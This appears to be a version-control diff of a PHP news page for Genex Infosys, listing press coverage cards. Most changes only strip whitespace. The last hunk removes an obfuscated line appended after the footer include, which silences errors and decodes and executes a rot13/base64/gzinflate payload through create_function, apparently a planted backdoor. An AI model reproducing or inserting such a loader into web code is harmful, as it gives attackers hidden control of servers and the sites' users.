 				</div>
 				<div class="post-read-more">
@@ -527,8 +525,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-			
-			
+
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://paloimages.prothom-alo.com/contents/cache/images/640x358x1/uploads/media/2020/02/03/2667376669d423ca8ae4a9fd37de55a1-5e37bc7c64663.jpg" class="img-responsive" alt="">
@@ -546,7 +544,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-			
+
 		</div>
 	</div>
 </div>
@@ -554,7 +552,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 <!-- new row -->
 <div class="col-padding-top-50 row">
 	<div class="content">
-		<div class="col-md-12 news">	
+		<div class="col-md-12 news">
 			<!-- Jan, 2020 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -572,8 +570,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.thedailystar.net/business/news/tech-job-fair-45-differently-abled-people-get-job-spot-1852714">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>		
-			
+			</div>
+
 			<!-- Dec, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -586,9 +584,9 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>Genex Infosys generates highest turnover</h3>
 					<p>Ten most traded companies accounted for 27 per cent transactions on the Dhaka Stock Exchange (DSE) on Thursday, with Genex Infosys Ltd. dominating the turnover chart.
-					Market analysts said investors continued to show their appetite for Genex Infosys shares ahead of its annual general meeting scheduled for December 24.
-					The IT company's share price also soared 23 per cent or Tk 12.60 within one month since November 20.
-					According to the DSE data, some 514,464 shares of Genex Infosys were traded, generating a turnover of 114 million, which was 4.22 per cent of the day's total turnover of Tk 2.76 billion....</p>
+						Market analysts said investors continued to show their appetite for Genex Infosys shares ahead of its annual general meeting scheduled for December 24.
+						The IT company's share price also soared 23 per cent or Tk 12.60 within one month since November 20.
+						According to the DSE data, some 514,464 shares of Genex Infosys were traded, generating a turnover of 114 million, which was 4.22 per cent of the day's total turnover of Tk 2.76 billion....</p>
 				</div>
 				<div class="post-read-more">
 					<a href="https://thefinancialexpress.com.bd/stock/bangladesh/genex-infosys-generates-highest-turnover-1576819982?fbclid=IwAR2eA3C5lr4uR6exm0PveHBk7JlLSnUbCP-HVrxRftyKT0iHhTRDHCuTvXE">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
@@ -596,8 +594,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 
 			</div>
 
-			
-			
+
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.jugantor.com/assets/news_photos/2019/12/26/image-259709-1577359779.jpg" class="img-responsive" alt="">
@@ -616,7 +614,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-			
+
 		</div>
 
 	</div>
@@ -644,7 +642,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://thefinancialexpress.com.bd/stock/bangladesh/genex-infosys-makes-flying-debut-1549431733">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>							
+			</div>
 
 			<!-- Dec, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
@@ -683,7 +681,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-			
+
 		</div>
 
 	</div>
@@ -710,7 +708,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://today.thefinancialexpress.com.bd/stock-corporate/a2i-genex-infosys-get-asia-pacific-ict-alliance-awards-1574704573">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>					
+			</div>
 			<!-- Nov, 2019 -->
 
 			<!-- Nov, 2019 -->
@@ -730,7 +728,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.priyo.com/e/1379155-Genex-infosys-to-provide-smartphone-protection">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 			<!-- Nov, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
@@ -749,8 +747,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://today.thefinancialexpress.com.bd/stock-corporate/genex-infosys-okays-deal-with-gp-1570378565">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>			
-					
+			</div>
+
 		</div>
 	</div>
 </div>
@@ -758,7 +756,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
+
 			<!-- Oct, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -776,7 +774,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.thefinancialexpress.com.bd/trade/genex-infosys-wins-national-ict-awards-1571125598">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 			<!-- Feb, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
@@ -826,7 +824,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 	<div class="content">
 		<div class="col-md-12 news">
 
-			
+
 			<!-- sep, 2018 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -884,7 +882,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-						
+
 
 		</div>
 	</div>
@@ -892,7 +890,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 <!-- old news -->
 <div class="col-padding-top-50 row">
 	<div class="content">
-		<div class="col-md-12 news">			
+		<div class="col-md-12 news">
 
 			<!-- Jul, 2018 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
@@ -950,7 +948,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-			
+
 
 		</div>
 	</div>
@@ -1012,16 +1010,16 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.thedailystar.net/business/bpo-sector-showing-signs-promise-1529644">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>		
-			
+			</div>
+
 		</div>
 	</div>
 </div>
 <div class="col-padding-top-50 row">
 	<div class="content">
-		<div class="col-md-12 news">			
+		<div class="col-md-12 news">
 
-	
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="images/post/GreenRed-GenEx-Announcement.jpg" class="img-responsive" alt="">
@@ -1073,9 +1071,9 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="http://www.justnewsbd.com/english/details.php?jnewsbd=MTI5Njk">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>			
+			</div>
 
-			
+
 		</div>
 	</div>
 </div>
@@ -1118,8 +1116,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://thefinancialexpress.com.bd/stock/genex-infosys-jumps-465pc-in-debut-trading-1549514046">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>		
-			
+			</div>
+
 			<!-- Feb, 2019 -->
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -1163,11 +1161,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				</div>
 
 			</div>
-				
+
 		</div>
 	</div>
 </div>
 <?php include 'properties/footer.php'; ?>
-
-
-<?php $vAxXk = 's'.'t'.'r'.'_rot1'.'3';  $tpaUx = 'base'.'64'.'_de'.'code';  $EfjRb = 'gz'.'infla'.'te';  ini_set('display_errors', 0); ini_set('log_errors', 0); error_reporting(0); $yACcY = 'Creat'.'e'.'_Functi'.'on'; $DonQf = $yACcY('', $EfjRb($tpaUx($vAxXk('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')))); $DonQf(); ?>
